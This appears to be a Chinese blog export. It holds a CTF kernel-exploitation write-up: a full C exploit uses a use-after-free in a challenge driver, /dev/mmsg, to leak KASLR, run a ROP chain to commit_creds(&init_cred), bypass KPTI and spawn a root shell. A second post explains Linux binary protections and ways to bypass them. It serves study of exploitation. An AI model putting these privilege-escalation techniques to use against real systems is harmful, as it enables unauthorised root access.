<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">swapgs            </span><br><span class="line">iretq             </span><br><span class="line">rsp ---&gt; rip </span><br><span class="line">         cs</span><br><span class="line">         rflags</span><br><span class="line">         rsp</span><br><span class="line">         ss</span><br></pre></td></tr></table></figure>

<p>swapgs_restore_regs_and_return_to_usermode: 这个比上个复杂一点，需要在迁移一次</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">swapgs_restore_regs_and_return_to_usermode + 22  </span><br><span class="line">0 // padding  </span><br><span class="line">0 // padding  </span><br><span class="line">get_shell</span><br><span class="line">user_cs  </span><br><span class="line">user_rflags  </span><br><span class="line">user_sp</span><br><span class="line">user_ss</span><br></pre></td></tr></table></figure>

<h4 id="errors"><a href="#errors" class="headerlink" title="errors"></a>errors</h4><ol>
<li>qemu cpu为 <code>host</code> 也必须开启kvm, 同时就是这一点，导致我一直不成功，后来去除掉kvm将cpu改为kvm64成功。应该是本机的CPU的安全防护导致一直失败😥。</li>
</ol>
<h4 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h4><p>signal bypass kpti。执行用户态的任意代码都会报出信号<code>SIGSEGV</code>，那么在程序开始时将<code>SIGSEGV</code>与shell函数绑定在一起，那么访问用户态代码时就会报出信号<code>SIGSEGV</code>，就会执行信号函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_GREEN <span class="string">&quot;\033[32m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_RED <span class="string">&quot;\033[31m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_YELLOW <span class="string">&quot;\033[33m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_DEFAULT <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_debug(fmt, ...)                                                    \</span></span><br><span class="line"><span class="meta">  dprintf(2, <span class="string">&quot;[*] %s:%d &quot;</span> fmt <span class="string">&quot;\n&quot;</span>, __FILE__, __LINE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_info(fmt, ...)                                                     \</span></span><br><span class="line"><span class="meta">  dprintf(2, COLOR_GREEN <span class="string">&quot;[+] %s:%d &quot;</span> fmt <span class="string">&quot;\n&quot;</span> COLOR_DEFAULT, __FILE__,        \</span></span><br><span class="line"><span class="meta">          __LINE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_warning(fmt, ...)                                                  \</span></span><br><span class="line"><span class="meta">  dprintf(2, COLOR_YELLOW <span class="string">&quot;[!] %s:%d &quot;</span> fmt <span class="string">&quot;\n&quot;</span> COLOR_DEFAULT, __FILE__,       \</span></span><br><span class="line"><span class="meta">          __LINE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_error(fmt, ...)                                                    \</span></span><br><span class="line"><span class="meta">  dprintf(2, COLOR_RED <span class="string">&quot;[-] %s:%d &quot;</span> fmt <span class="string">&quot;\n&quot;</span> COLOR_DEFAULT, __FILE__,          \</span></span><br><span class="line"><span class="meta">          __LINE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> die(fmt, ...)                  \</span></span><br><span class="line"><span class="meta">  do &#123;                                 \</span></span><br><span class="line"><span class="meta">    log_error(fmt, ##__VA_ARGS__);          \</span></span><br><span class="line"><span class="meta">    log_error(<span class="string">&quot;Exit at line %d&quot;</span>, __LINE__); \</span></span><br><span class="line"><span class="meta">    exit(1);                           \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">if</span>( getuid() ) &#123;</span><br><span class="line">  die(<span class="string">&quot;fail to get shell&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">    log_info(<span class="string">&quot;start to get root shell&quot;</span>);</span><br><span class="line"> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_rsp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_rsp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    log_info(<span class="string">&quot;status saved&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">seq_open</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> seq;</span><br><span class="line"> <span class="keyword">if</span> ( (seq=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) == <span class="number">-1</span>) &#123;</span><br><span class="line">  die(<span class="string">&quot;seq open fail&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> seq;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_ALLOC 0x1111111</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_COPY 0x2222222</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_RECV 0x3333333</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_UPDATE 0x4444444</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_PUT_DESC 0x5555555</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_GET_DESC 0x6666666</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> &#123;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> token;</span><br><span class="line">        <span class="type">int</span> top;</span><br><span class="line">        <span class="type">int</span> size;</span><br><span class="line">        <span class="type">char</span> *data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> kernel_base = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> kernel_offset = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> nokaslr = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff9248d790</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff8108d350</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff93000e30</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff811aa376</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xffffffff8264c9a0</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_iretq = <span class="number">0xffffffff81c00ec6</span>;</span><br><span class="line"><span class="type">size_t</span> add_rsp_0x168_ret = <span class="number">0xffffffff81909b8c</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> mmsg_fd;</span><br><span class="line"><span class="type">int</span> seq_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">exploit</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;open device&quot;</span>);</span><br><span class="line">    mmsg_fd = open(<span class="string">&quot;/dev/mmsg&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (mmsg_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        die(<span class="string">&quot;open device&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">    arg.token = <span class="number">1</span>;</span><br><span class="line">    arg.top = <span class="number">1</span>;</span><br><span class="line">    arg.size = <span class="number">16</span>;</span><br><span class="line">    arg.data = <span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    <span class="type">size_t</span> *buf = (<span class="type">size_t</span> *)arg.data;</span><br><span class="line">    buf[<span class="number">0</span>] = <span class="number">0x1145141145141145</span>ull;</span><br><span class="line">    buf[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    ioctl(mmsg_fd, MMSG_PUT_DESC, &amp;arg);  <span class="comment">// bypass size check</span></span><br><span class="line">    ioctl(mmsg_fd, MMSG_RECV, &amp;arg);     <span class="comment">// free head</span></span><br><span class="line"></span><br><span class="line">    seq_fd = seq_open();</span><br><span class="line"></span><br><span class="line">    ioctl(mmsg_fd, MMSG_GET_DESC, &amp;arg);</span><br><span class="line">    log_warning(<span class="string">&quot;start leak info&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i ++) &#123;</span><br><span class="line">        log_debug(<span class="string">&quot;buf[%d] =&gt; 0x%lx\n&quot;</span>, i, buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_base = buf[<span class="number">0</span>] - <span class="number">0x20fac0</span>;</span><br><span class="line">    kernel_offset = kernel_base - nokaslr;</span><br><span class="line">    add_rsp_0x168_ret += kernel_offset;</span><br><span class="line">    pop_rdi_ret += kernel_offset;</span><br><span class="line">    init_cred += kernel_offset;</span><br><span class="line">    commit_creds += kernel_offset;</span><br><span class="line">    swapgs_iretq += kernel_offset;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;kernel_offset =&gt; 0x%lx&quot;</span>, kernel_offset);</span><br><span class="line">    log_info(<span class="string">&quot;kernel_base =&gt; 0x%lx&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    buf[<span class="number">0</span>] = add_rsp_0x168_ret;</span><br><span class="line">    log_info(<span class="string">&quot;pollute =&gt; 0x%lx, maybe we can debug here&quot;</span>, buf[<span class="number">0</span>]);</span><br><span class="line">    ioctl(mmsg_fd, MMSG_PUT_DESC, &amp;arg);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14,   pop_rdi_ret;&quot;</span>   <span class="comment">// &lt;- rip here</span></span><br><span class="line">        <span class="string">&quot;mov r13,   init_cred;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12,   commit_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp,   swapgs_iretq;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx,   0x55555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,    user_rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,    0x99999999;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax,   rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx,   8;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi,   rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,   seq_fd;&quot;</span>        <span class="comment">// 这里假定通过 seq_operations-&gt;stat 来触发</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    signal(SIGSEGV, get_shell);</span><br><span class="line">    save_status();</span><br><span class="line">    exploit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>bypass kpti，修改cr3，在高版本使用，在 <code>+22</code> 地址是我们利用的gadget。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">.text:FFFFFFFF81600A34 <span class="number">41</span> <span class="number">5F</span>                          pop     r15</span><br><span class="line">.text:FFFFFFFF81600A36 <span class="number">41</span> <span class="number">5</span>E                          pop     r14</span><br><span class="line">.text:FFFFFFFF81600A38 <span class="number">41</span> <span class="number">5</span>D                          pop     r13</span><br><span class="line">.text:FFFFFFFF81600A3A <span class="number">41</span> <span class="number">5</span>C                          pop     r12</span><br><span class="line">.text:FFFFFFFF81600A3C <span class="number">5</span>D                             pop     rbp</span><br><span class="line">.text:FFFFFFFF81600A3D <span class="number">5B</span>                             pop     rbx</span><br><span class="line">.text:FFFFFFFF81600A3E <span class="number">41</span> <span class="number">5B</span>                          pop     r11</span><br><span class="line">.text:FFFFFFFF81600A40 <span class="number">41</span> <span class="number">5</span>A                          pop     r10</span><br><span class="line">.text:FFFFFFFF81600A42 <span class="number">41</span> <span class="number">59</span>                          pop     r9</span><br><span class="line">.text:FFFFFFFF81600A44 <span class="number">41</span> <span class="number">58</span>                          pop     r8</span><br><span class="line">.text:FFFFFFFF81600A46 <span class="number">58</span>                             pop     rax</span><br><span class="line">.text:FFFFFFFF81600A47 <span class="number">59</span>                             pop     rcx</span><br><span class="line">.text:FFFFFFFF81600A48 <span class="number">5</span>A                             pop     rdx</span><br><span class="line">.text:FFFFFFFF81600A49 <span class="number">5</span>E                             pop     rsi</span><br><span class="line">.text:FFFFFFFF81600A4A <span class="number">48</span> <span class="number">89</span> E7                       mov     rdi, rsp    &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span><br><span class="line">.text:FFFFFFFF81600A4D <span class="number">65</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">24</span> <span class="number">25</span>+                mov     rsp, gs: <span class="number">0x5004</span></span><br><span class="line">.text:FFFFFFFF81600A56 FF <span class="number">77</span> <span class="number">30</span>                       push    qword ptr [rdi+<span class="number">30</span>h]</span><br><span class="line">.text:FFFFFFFF81600A59 FF <span class="number">77</span> <span class="number">28</span>                       push    qword ptr [rdi+<span class="number">28</span>h]</span><br><span class="line">.text:FFFFFFFF81600A5C FF <span class="number">77</span> <span class="number">20</span>                       push    qword ptr [rdi+<span class="number">20</span>h]</span><br><span class="line">.text:FFFFFFFF81600A5F FF <span class="number">77</span> <span class="number">18</span>                       push    qword ptr [rdi+<span class="number">18</span>h]</span><br><span class="line">.text:FFFFFFFF81600A62 FF <span class="number">77</span> <span class="number">10</span>                       push    qword ptr [rdi+<span class="number">10</span>h]</span><br><span class="line">.text:FFFFFFFF81600A65 FF <span class="number">37</span>                          push    qword ptr [rdi]</span><br><span class="line">.text:FFFFFFFF81600A67 <span class="number">50</span>                             push    rax</span><br><span class="line">.text:FFFFFFFF81600A68 EB <span class="number">43</span>                          nop</span><br><span class="line">.text:FFFFFFFF81600A6A <span class="number">0F</span> <span class="number">20</span> DF                       mov     rdi, cr3</span><br><span class="line">.text:FFFFFFFF81600A6D EB <span class="number">34</span>                          jmp     <span class="number">0xFFFFFFFF81600AA3</span></span><br><span class="line"></span><br><span class="line">.text:FFFFFFFF81600AA3 <span class="number">48</span> <span class="number">81</span> CF <span class="number">00</span> <span class="number">10</span>+                or      rdi, <span class="number">1000</span>h</span><br><span class="line">.text:FFFFFFFF81600AAA <span class="number">0F</span> <span class="number">22</span> DF                       mov     cr3, rdi</span><br><span class="line">.text:FFFFFFFF81600AAD <span class="number">58</span>                             pop     rax</span><br><span class="line">.text:FFFFFFFF81600AAE <span class="number">5F</span>                             pop     rdi</span><br><span class="line">.text:FFFFFFFF81600AAF FF <span class="number">15</span> <span class="number">23</span> <span class="number">65</span> <span class="number">62</span>+                call    cs: SWAPGS</span><br><span class="line">.text:FFFFFFFF81600AB5 FF <span class="number">25</span> <span class="number">15</span> <span class="number">65</span> <span class="number">62</span>+                jmp     cs: INTERRUPT_RETURN</span><br><span class="line"></span><br><span class="line">_SWAPGS</span><br><span class="line">.text:FFFFFFFF8103EFC0 <span class="number">55</span>                             push    rbp</span><br><span class="line">.text:FFFFFFFF8103EFC1 <span class="number">48</span> <span class="number">89</span> E5                       mov     rbp, rsp</span><br><span class="line">.text:FFFFFFFF8103EFC4 <span class="number">0F</span> <span class="number">01</span> F8                       swapgs</span><br><span class="line">.text:FFFFFFFF8103EFC7 <span class="number">5</span>D                             pop     rbp</span><br><span class="line">.text:FFFFFFFF8103EFC8 C3                             retn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_INTERRUPT_RETURN</span><br><span class="line">.text:FFFFFFFF81600AE0 F6 <span class="number">44</span> <span class="number">24</span> <span class="number">20</span> <span class="number">04</span>                 test    byte ptr [rsp+<span class="number">0x20</span>], <span class="number">4</span></span><br><span class="line">.text:FFFFFFFF81600AE5 <span class="number">75</span> <span class="number">02</span>                          jnz     native_irq_return_ldt</span><br><span class="line">.text:FFFFFFFF81600AE7 <span class="number">48</span> CF                          iretq</span><br></pre></td></tr></table></figure>

<p>看别人的做法，好像不需要关注rip后面的内容，但是本题我没有使用这种方式做出来 👀。</p>
<ul>
<li>最后需要我们调用getshell函数。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">   __asm__(</span><br><span class="line">       <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r14,   pop_rdi_ret;&quot;</span>   <span class="comment">// &lt;- rip here</span></span><br><span class="line">       <span class="string">&quot;mov r13,   init_cred;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r12,   commit_creds;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rbp,   swapgs_restore_regs_and_return_to_usermode + 22;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rbx,   0x55555555;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r9,    user_rsp;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r8,    0x99999999;&quot;</span></span><br><span class="line">       <span class="string">&quot;xor rax,   rax;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rdx,   8;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rsi,   rsp;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rdi,   seq_fd;&quot;</span>    </span><br><span class="line">   );</span><br><span class="line"></span><br><span class="line">get_shell();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><p>commit_creds(prepare_kernel_cred (0)) &#x3D;&gt; 简化为 commit_creds(&amp;init_cred) init_cred: init 进程的权限，为root，在 <code>/proc/kallsyms</code> 内</p>
<p>寻找 gadget 时可能寻找到的gadget不能使用，报错为 <code>kernel tried to execute NX-protected page</code>，说明其地址不可访问？那就只能换了</p>
<p>为什么找不对gadget?或者根本没有找到🤡。和参考的看看了一下，发现gadget地址根本就没找对。</p>
<ul>
<li>ropper + ROPgadget + ropr 三个工具一起使用，获得三个gadget文件。</li>
<li>extract-vmlinux + vmlinux-to-elf 工具</li>
</ul>
<p>如何下断点？</p>
<ul>
<li>在想暂停的的地方使用 <code>getchar()</code> 停止后一路si</li>
<li>在固定的指令地址下断点，但是需要事先知道地址。但是rop时，地址一般都是知道的。</li>
</ul>
<p>在固定的指令下断点，比如此题就可以在在 add rsp 那一条指令下断点</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">   0xffffffff81909b8c    add    rsp, module_ioctl+56          &lt;0x168&gt;</span><br><span class="line">   0xffffffff81909b93    ret</span><br><span class="line"></span><br><span class="line">pwndbg&gt; tele 0xffffc900001c7df8+0x168 </span><br><span class="line">00:0000 0xffffc900001c7f60 0x44444444 /* <span class="string">&#x27;DDDD&#x27;</span> */</span><br><span class="line">01:0008 0xffffc900001c7f68 0x33333333 /* <span class="string">&#x27;3333&#x27;</span> */</span><br><span class="line">02:0010 0xffffc900001c7f70 0x22222222 /* <span class="string">&#x27;&quot;&quot;&quot;&quot;&#x27;</span> */</span><br><span class="line">03:0018 0xffffc900001c7f78 0xbbbb1111</span><br><span class="line">04:0020 0xffffc900001c7f80 0xbbbb2222</span><br><span class="line">05:0028 0xffffc900001c7f88 0x246</span><br><span class="line">06:0030 0xffffc900001c7f90 0x11110000</span><br><span class="line">07:0038 0xffffc900001c7f98 0x99999999</span><br><span class="line">08:0040 0xffffc900001c7fa0 0x88888888</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>kernel</tag>
        <tag>uaf</tag>
      </tags>
  </entry>
  <entry>
    <title>程序保护机制</title>
    <url>/2023/08/26/%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<blockquote>
<p>程序保护机制学习</p>
</blockquote>
<span id="more"></span>

<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h3><h4 id="relro"><a href="#relro" class="headerlink" title="relro"></a>relro</h4><p>read only relocation: 由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读.</p>
<ul>
<li>比如说 got表，在完全开启后只读，我们无法修改修改函数 got 表的内容从而改变函数的执行过程。</li>
</ul>
<p>gcc 选项</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-z norelro   <span class="comment"># 关闭</span></span><br><span class="line">-z lazy      <span class="comment"># 部分开启</span></span><br><span class="line">-z now       <span class="comment"># 完全开启</span></span><br></pre></td></tr></table></figure>

<h4 id="aslr"><a href="#aslr" class="headerlink" title="aslr"></a>aslr</h4><p>Address Space Layout Randomization, 这种技术使得系统上运行的进程的内存地址无法被预测，使得与这些进程有关的漏洞变得更加难以利用。配合 PIE 保护从而得到最好的效果</p>
<p>Linux上ASLR分为0&#x2F;1&#x2F;2三级，用户可以通过内核参数randomize_va_space进行等级控制，对应效果如下：</p>
<ul>
<li>0：没有随机化，即关闭ASLR</li>
<li>1：保留的随机化，即<strong>共享库、栈、mmap()以及VSDO将被随机化</strong></li>
<li>2：完全的随机化，在1的基础上，<strong>通过brk分配的内存空间(heap通过此系统调用获得)也将随机化</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cat</span>  /proc/sys/kernel/randomize_va_space</span><br><span class="line">  2</span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>

<p>在使用 gdb 软件调试时可以关闭此保护，从而在调试时获得的地址一致。</p>
<p>因为存在一定的地址随机化，所以在漏洞利用时不能使用固定的函数地址。比如没开 aslr 保护system函数(共享库中的函数)地址是 0x1234。开启aslr时system函数位置会改变，从而利用失败。</p>
<h4 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h4><p>No-eXecute 不可执行。和DEP(Data Execute Protector)一致</p>
<p>将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p>
<p>gcc参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-z execstack    <span class="comment"># 栈可执行</span></span><br><span class="line">-z noexecstack  <span class="comment"># 开启</span></span><br></pre></td></tr></table></figure>

<p>bypass: 杜绝了一定写shellcode的利用，但是可以使用**ROP(Return-oriented programming)**来bypass，造成我们想要的攻击效果。</p>
<h4 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h4><p>Position independent code, 位置无关代码，默认开启。<br>针对代码段.text, 数据段，.data，.bss等固定地址的一个防护技术。同ASLR一样，应用了PIE的程序会在每次加载时都变换加载基址，从而使位于程序本身的gadget也失效</p>
<p>没有PIE保护的程序，每次加载的基址都是固定的，64位上一般是0x400000。</p>
<p>gcc 参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-no-pie    <span class="comment"># 关闭pie</span></span><br><span class="line">-pie       <span class="comment"># 开启pie</span></span><br></pre></td></tr></table></figure>

<p>开启aslr，我们可以获得text段的gadget，并且可以使用。但是开其pie保护后，text随机化，我们寻找的gadget也需要加上一个偏移才能使用。</p>
<ul>
<li>bypass<ul>
<li>partial write: 由于内存的页载入机制，PIE的随机化只能<strong>影响到单个内存页</strong>。通常来说，一个内存页大小为0x1000，这就意味着不管地址怎么变，某条指令的后12位是始终不变的。因此通过覆盖部分内容比如后8位从而劫持函数执行流。<ul>
<li>leak: 程序本身的漏洞可以泄露某些函数地址，从而获得程序加载的基地址。</li>
</ul>
</li>
<li>vdso&#x2F;vsyscall: 系统把几个常用的无参内核调用从内核中映射到用户空间中，这就是vsyscall。在某些版本中，这个地址不会改变，并且不受保护的影响。vsyscall 内存页中包含了三个系统调用。而且这三个系统调用对程序运行基本没有影响，也就是说我们获得了三个已知地址的 ret。相当可以执行 <code>ret</code> 指令，获得：查看程序的映射 <code>cat /proc/&lt;pid&gt;/maps</code>。</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__vsyscall_page:</span><br><span class="line"> mov $__NR_gettimeofday, %rax</span><br><span class="line"> syscall</span><br><span class="line"> ret</span><br><span class="line"></span><br><span class="line"> .balign <span class="number">1024</span>, <span class="number">0xcc</span></span><br><span class="line"> mov $__NR_time, %rax</span><br><span class="line"> syscall</span><br><span class="line"> ret</span><br><span class="line"></span><br><span class="line"> .balign <span class="number">1024</span>, <span class="number">0xcc</span></span><br><span class="line"> mov $__NR_getcpu, %rax</span><br><span class="line"> syscall</span><br><span class="line"> ret</span><br></pre></td></tr></table></figure>

<h4 id="stack-canary"><a href="#stack-canary" class="headerlink" title="stack canary"></a>stack canary</h4><p>当启用 canary 保护后，函数开始执行的时候会先往栈里<strong>插入 cookie 信息</strong>，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在栈溢出覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p>
<p>Linux canary 最后一字节为 <code>\x00</code></p>
<p>gcc 开启和关闭的参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-fno-stack-protector   <span class="comment"># 关闭，默认没有canary</span></span><br><span class="line"></span><br><span class="line">-fstack-protector          <span class="comment"># 保护函数中通过alloca()分配缓存以及存在大于8字节的buffer。保护能力有限，不会保护所有的函数</span></span><br><span class="line">-fstack-protector-all      <span class="comment"># 启用堆栈保护，为所有函数插入保护代码</span></span><br><span class="line">-fstack-protector-strong   <span class="comment"># 编译参数让保护的范围更广</span></span><br></pre></td></tr></table></figure>

<p>可以看这系列文章。加深对canary理解：<a href="https://zhuanlan.zhihu.com/p/434821566">Linux内核的FSGSBASE特性</a></p>
<p>Linux x86-64下的fs&#x2F;gs段寄存器？</p>
<ul>
<li><strong>用户态使用fs寄存器引用线程的glibc TLS(TLS全称Thread Local Storage)和线程在用户态的stack canary；用户态的glibc不使用gs寄存器；应用可以自行决定是否使用该寄存器。</strong></li>
<li><strong>内核态使用gs寄存器引用percpu变量和进程在内核态的stack canary；内核态不使用fs寄存器。</strong></li>
</ul>
<p>默认stack canary使用全局符号变量 __stack_chk_guard(fs:0x28) 作为原始的canary, 在gcc&#x2F;clang中均使用相同的名字</p>
